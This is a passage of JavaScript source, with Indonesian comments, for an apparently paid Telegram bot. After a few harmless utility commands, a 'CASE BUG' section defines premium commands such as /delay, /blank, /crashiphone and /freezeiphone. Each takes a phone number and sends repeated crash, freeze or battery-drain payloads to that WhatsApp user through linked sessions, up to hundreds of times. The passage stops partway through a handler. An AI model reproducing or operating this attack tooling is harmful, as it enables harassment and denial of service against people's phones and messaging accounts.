            fileName = reply.audio.file_name || `audio_${Date.now()}.mp3`;
            fileSize = reply.audio.file_size;
            mimeType = reply.audio.mime_type || 'audio/mpeg';
        } else if (reply.voice) {
            fileId = reply.voice.file_id;
            fileName = `voice_${Date.now()}.ogg`;
            fileSize = reply.voice.file_size;
            mimeType = 'audio/ogg';
        } else {
            await bot.deleteMessage(chatId, loadingMsg.message_id);
            return bot.sendMessage(chatId, "⚠️ Yang direply bukan file/foto/video/audio/voice.");
        }

        // Cek ukuran file (max 50MB)
        if (fileSize > 50 * 1024 * 1024) {
            await bot.deleteMessage(chatId, loadingMsg.message_id);
            return bot.sendMessage(chatId, "❌ File terlalu besar! Maksimal 50 MB.");
        }

        // Download file dari Telegram
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data);

        // Upload ke Deline
        const uploadedUrl = await uploadDeline(buffer, fileName, mimeType);

        // Hapus pesan loading
        await bot.deleteMessage(chatId, loadingMsg.message_id);

        // Escape HTML untuk filename dan mimeType
        const safeFileName = escapeHTML(fileName);
        const safeMimeType = escapeHTML(mimeType);

        // Format pesan hasil dengan HTML
        const caption = `
<pre>📤 T O U R L 📤</pre>

📦 <b>Size:</b> ${formatBytes(fileSize)}
📁 <b>Type:</b> ${safeMimeType}
📄 <b>Name:</b> ${safeFileName}

✅ <b>Link:</b> <code>${uploadedUrl}</code>
        `.trim();

        // Kirim dengan inline button
        const keyboard = {
            inline_keyboard: [
                [
                    { text: "🔗 Buka Link", url: uploadedUrl }
                ],
                [
                    { text: "📋 Salin Link", callback_data: `copy_url` }
                ]
            ]
        };

        await bot.sendMessage(chatId, caption, {
            parse_mode: "HTML",
            reply_markup: keyboard
        });

        // Simpan URL terakhir untuk callback copy
        if (!bot.lastUrls) bot.lastUrls = {};
        bot.lastUrls[chatId] = uploadedUrl;

    } catch (e) {
        console.log("Error tourl:", e.message);
        await bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
        bot.sendMessage(chatId, `❌ <b>Upload gagal</b>\n${escapeHTML(e.message || e)}`, { parse_mode: "HTML" });
    }
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data === 'copy_url') {
        const url = bot.lastUrls && bot.lastUrls[chatId];
        
        if (url) {
            await bot.answerCallbackQuery(query.id, {
                text: "✅ Siap dicopy!",
                show_alert: false
            });

            // Kirim link lagi untuk memudahkan copy
            await bot.sendMessage(chatId, `📋 <b>Copy link ini:</b>\n\n<code>${url}</code>`, { 
                parse_mode: "HTML" 
            });
        } else {
            await bot.answerCallbackQuery(query.id, {
                text: "❌ Link tidak ditemukan",
                show_alert: true
            });
        }
    }
});

bot.onText(/\/info/, (msg) => {

    const user = msg.from;
    const idNoktel = String(user.id).charAt(0);
    const firstName = escapeHTML(user.first_name);
    const username = user.username || 'tidak ada';

    const teks = `
<b>👤 INFO USER</b>

🆔 ID User: <code>${user.id}</code>
👤 Nama: <b>${firstName}</b>
💬 Username: @${username}

📎 ID Noktel: <code>${idNoktel}</code>
    `;

    bot.sendMessage(msg.chat.id, teks, { parse_mode: "HTML" });
});

bot.onText(/\/ustad (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    let loading = null;

    try {
        if (!text) return bot.sendMessage(chatId, "⚠️ Masukkan teks.\nContoh:\n/ustadz2 jangan lupa sholat dek");

        try {
            loading = await bot.sendMessage(chatId, "⏳ Sedang membuat gambar...");
        } catch (_) {}

        const apiURL = `https://elaina-api-docs.biz.id/imagecreator/ustadz2?text=${encodeURIComponent(text)}`;

        let res;
        try {
            res = await fetch(apiURL);
        } catch (error) {
            if (loading) await safeDelete(chatId, loading.message_id);
            return bot.sendMessage(chatId, "⚠️ Tidak bisa menghubungi server.");
        }

        if (!res.ok) {
            if (loading) await safeDelete(chatId, loading.message_id);
            return bot.sendMessage(chatId, "⚠️ Server error, coba beberapa saat lagi.");
        }

        let arrayBuf;
        try {
            arrayBuf = await res.arrayBuffer();
        } catch (_) {
            if (loading) await safeDelete(chatId, loading.message_id);
            return bot.sendMessage(chatId, "⚠️ Gagal membaca data gambar.");
        }

        const buffer = Buffer.from(arrayBuf);

        if (!buffer || buffer.length < 50) {
            if (loading) await safeDelete(chatId, loading.message_id);
            return bot.sendMessage(chatId, "⚠️ Server mengirim gambar rusak.");
        }

        if (loading) await safeDelete(chatId, loading.message_id);

        await bot.sendPhoto(chatId, buffer);

    } catch (err) {
        console.error("USTADZ2 FATAL ERROR:", err);

        if (loading) await safeDelete(chatId, loading.message_id);

        bot.sendMessage(chatId, "⚠️ Terjadi kesalahan tak terduga.");
    }
});

async function safeDelete(chatId, msgId) {
    try {
        await bot.deleteMessage(chatId, msgId);
    } catch (_) {}
}


//=======CASE BUG=========//
bot.onText(/\/delay(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /delay 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ FIXED VARIABLE
    const mention = `@${formattedNumber}`;
    const target = jid;

    for (let i = 0; i < 200; i++) {
      await trashprotocol(target, false);
      await DelayOs(sock, target);
      await DelayFcJarr(sock, target);
      await FaiqDelaySpam(sock, target);
      await YxGDahYak(sock, target);
      await sleep(1000)
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG Delay]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/buldo(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /buldo 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ FIXED VARIABLE
    const mention = `@${formattedNumber}`;
    const target = jid;

    for (let i = 0; i < 500; i++) {
    await FaiqDrainHard(sock, target);
    await FaiqDrainHard(sock, target);
    await FaiqDrainHard(sock, target);
    await sleep(1000)
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG Delay]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/delaybeta(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /delaybeta 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ FIXED VARIABLE
    const mention = `@${formattedNumber}`;
    const target = jid;

    for (let i = 0; i < 500; i++) {
    await FaiqBeta(target, true);
    await FaiqBeta(target, true);
    await FaiqBeta(target, true); 
    await DelayMarkKontol(target, true, sock);
    await DelayMarkKontol(target, true, sock);
    await sleep(1000)
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG Delay]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/blank(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /blank 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ FIXED VARIABLE
    const mention = `@${formattedNumber}`;
    const target = jid;

    for (let i = 0; i < 100; i++) {
      await Evoblank(target);
      await FaiqFcNoClick(target);
      await BlankAhh(sock, target);
      await FaiqFcNoClick(target);
      await sleep(1000)
   
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG Delay]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/delayinvisible(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /delayinvisible 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ Tambahkan ini agar tidak error
    const target = jid;

    for (let i = 0; i < 100; i++) {
      await InvisibleDelay(sock, jid);
      await BrutDelay(sock, target);
      await DelayInvisV1(sock, target);
      await FaiqDelaySpam(sock, target);
      await FaiqDelayInvisHard(target, false);
      await threepelDelayInvis(sock, target);
      await threepelDelayInvis(sock, target);
      await sleep(1000)
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG FREEZE]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/blankiphone(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /blankiphone 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ Tambahkan ini agar tidak error
    const target = jid;

    for (let i = 0; i < 70; i++) {
      await BlankIphoneCore(target);
      await freezeIphone(target);
      await sleep(1000)
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG FREEZE]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});

bot.onText(/\/invisibleios(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /invisibleios 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ Tambahkan ini agar tidak error
    const target = jid;

    for (let i = 0; i < 170; i++) {
      await fcAyos(sock, target);
      await sleep(1000)
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG FREEZE]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});

bot.onText(/\/crashiphone(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /crashiphone 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ Tambahkan ini agar tidak error
    const target = jid;

    for (let i = 0; i < 50; i++) {
      await iosnew(sock, target);
      await sleep(1000)
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG FREEZE]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/forceios(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /forceios 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ Tambahkan ini agar tidak error
    const target = jid;

    for (let i = 0; i < 50; i++) {
      await FaiqFcIos(target);
      await sleep(1000)
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG FREEZE]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/freezeiphone(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /freezeiphone 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxxxx terlebih dahulu.`);
  }

  try {
    const sentMessage = await bot.sendPhoto(chatId, "https://api.deline.web.id/iWRLJTSDZn.jpg", {
      caption: `
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ⏳ Mengirim bug...
</blockquote>
`, parse_mode: "HTML"
    });

    console.log("MENGIRIM BUG Mulai ke:", formattedNumber);

    // ✅ Tambahkan ini agar tidak error
    const target = jid;

    for (let i = 0; i < 70; i++) {
      await BlankIphoneCore(target);
      await freezeIphone(target);
      await sleep(1000)
    }

    console.log("[SUKSES] Bug berhasil dikirim ke:", formattedNumber);

    await bot.editMessageCaption(`
<blockquote>
# 𝐒𝐄𝐍𝐃𝐈𝐍𝐆 - 𝐁𝐔𝐆
- Target : ${formattedNumber}
- Status : ✅ Success 
</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ 𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    });

  } catch (error) {
    console.error("[ERROR BUG FREEZE]", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug:\n${error.message}`);
  }
});
bot.onText(/\/tes(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];

  if (!targetNumber || !/^\d{9,15}$/.test(targetNumber)) {
    return bot.sendMessage(chatId, `⚠️ Example : /tes 6281234567890`, { parse_mode: "Markdown" });
  }

  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const userId = msg.from.id;

  const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
  if (!isPremium) {
    return bot.sendMessage(chatId, `❌ Akses ditolak.\nCommand ini hanya untuk pengguna Premium.`, { parse_mode: "Markdown" });
  }

  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum menggunakan kembali.`);
  }

  if (sessions.size === 0) {
